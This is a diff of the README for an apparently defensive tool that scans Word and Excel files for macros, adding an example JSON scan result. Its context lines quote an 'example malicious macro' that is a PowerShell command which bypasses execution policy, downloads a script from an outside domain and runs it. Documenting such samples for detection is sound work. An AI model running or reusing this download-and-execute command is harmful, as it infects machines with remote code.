@@ -29,6 +29,17 @@ or scan directories + subdirectories
 1. Excel XLS
 2. Word DOC
 
+## Example Response
+```JSON
+{ fileType: 'doc',
+  hasMacro: true,
+  macroTxt: 'Sub SortText()
+    Selecton.h
+    End P',
+  isValid: false,
+  hasContent: true }
+```
+
 ## Example Malicious MAcro / Command
 ```powershell
 C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -Exec Bypass -NoP -NoExit -Command iex((New-Object System.Net.WebClient).DownloadString('http://qwdiqjwdwqu9daquwddd.com/REX/slick.php?utma=torzd'))
